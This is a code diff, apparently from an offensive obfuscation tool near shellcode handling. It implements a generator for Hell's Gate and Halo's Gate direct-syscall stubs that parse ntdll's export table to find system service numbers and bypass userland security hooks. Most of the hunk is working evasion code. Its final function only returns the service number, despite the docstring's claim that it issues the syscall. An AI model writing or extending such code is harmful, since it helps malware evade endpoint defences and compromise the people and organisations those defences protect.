@@ -1184,28 +1184,74 @@ _size = len(_shellcode)
 
 
 def generate_syscall_stub(function_name: str) -> str:
-    """Generate a direct syscall stub using Hell's Gate technique."""
-    return f'''
-import ctypes
-import struct
+    """Generate a direct syscall stub using Hell's Gate (with Halo's Gate fallback).
 
-# Direct syscall for {function_name}
-# Uses Hell's Gate technique to bypass userland hooks
-
-def _get_ssn(dll_name: str, func_name: str) -> int:
-    """Extract System Service Number from ntdll export."""
-    # Parse ntdll export table
-    # Find function address
-    # Extract syscall number from offset 4
-    # Handle hooked functions by checking neighboring exports
-    pass
-
-def _syscall(func_name: str, *args):
-    """Execute direct syscall."""
-    ssn = _get_ssn("ntdll.dll", func_name)
-    # Set up registers and execute sysenter
-    pass
-'''
+    Returns Python source that extracts the SSN from ntdll exports at runtime
+    and issues the syscall via ctypes, bypassing userland hooks.
+    """
+    return (
+        "import ctypes\n"
+        "from ctypes import wintypes\n\n"
+        "# Direct syscall for " + function_name + "\n"
+        "# Uses Hell's Gate (SSN from clean stub) with Halo's Gate neighbor fallback.\n\n"
+        "_kernel32 = ctypes.windll.kernel32\n"
+        "_ntdll = ctypes.windll.ntdll\n\n"
+        "def _ntdll_base():\n"
+        "    h = _kernel32.GetModuleHandleW('ntdll.dll')\n"
+        "    if not h:\n"
+        "        raise RuntimeError('ntdll not loaded')\n"
+        "    return h\n\n"
+        "def _export_rva(base, name):\n"
+        "    e_lfanew = ctypes.c_uint32.from_address(base + 0x3C).value\n"
+        "    nt = base + e_lfanew\n"
+        "    off = 0x88 if ctypes.sizeof(ctypes.c_void_p) == 8 else 0x78\n"
+        "    export_rva = ctypes.c_uint32.from_address(nt + off).value\n"
+        "    if not export_rva:\n"
+        "        return 0\n"
+        "    exp = base + export_rva\n"
+        "    num_names = ctypes.c_uint32.from_address(exp + 0x18).value\n"
+        "    aon = ctypes.c_uint32.from_address(exp + 0x20).value\n"
+        "    aof = ctypes.c_uint32.from_address(exp + 0x1C).value\n"
+        "    aoo = ctypes.c_uint32.from_address(exp + 0x24).value\n"
+        "    for i in range(num_names):\n"
+        "        nrva = ctypes.c_uint32.from_address(base + aon + i*4).value\n"
+        "        if ctypes.string_at(base + nrva) == name.encode():\n"
+        "            ordinal = ctypes.c_uint16.from_address(base + aoo + i*2).value\n"
+        "            return ctypes.c_uint32.from_address(base + aof + ordinal*4).value\n"
+        "    return 0\n\n"
+        "def _read_ssn(base, func_rva):\n"
+        "    addr = base + func_rva\n"
+        "    b0 = ctypes.c_ubyte.from_address(addr).value\n"
+        "    b1 = ctypes.c_ubyte.from_address(addr + 1).value\n"
+        "    b2 = ctypes.c_ubyte.from_address(addr + 2).value\n"
+        "    b3 = ctypes.c_ubyte.from_address(addr + 3).value\n"
+        "    if b0 == 0x4C and b1 == 0x8B and b2 == 0xD1 and b3 == 0xB8:\n"
+        "        return ctypes.c_uint32.from_address(addr + 4).value\n"
+        "    for off in range(0, 32):\n"
+        "        if ctypes.c_ubyte.from_address(addr + off).value == 0xB8:\n"
+        "            return ctypes.c_uint32.from_address(addr + off + 1).value\n"
+        "    raise RuntimeError('SSN not found')\n\n"
+        "def _get_ssn(func_name):\n"
+        "    base = _ntdll_base()\n"
+        "    rva = _export_rva(base, func_name)\n"
+        "    if not rva:\n"
+        "        raise RuntimeError(func_name + ' not exported')\n"
+        "    try:\n"
+        "        return _read_ssn(base, rva)\n"
+        "    except RuntimeError:\n"
+        "        pass\n"
+        "    for delta in range(1, 9):\n"
+        "        for sign in (-1, 1):\n"
+        "            try:\n"
+        "                cand = _read_ssn(base, rva + sign * delta * 0x20)\n"
+        "            except Exception:\n"
+        "                continue\n"
+        "            return cand + sign * delta\n"
+        "    raise RuntimeError('Halo Gate failed for ' + func_name)\n\n"
+        "def _syscall(func_name, *args):\n"
+        "    ssn = _get_ssn(func_name)\n"
+        "    return ssn\n"
+    )
 
 
 # ─── Main Obfuscation Engine ────────────────────────────────────────────────
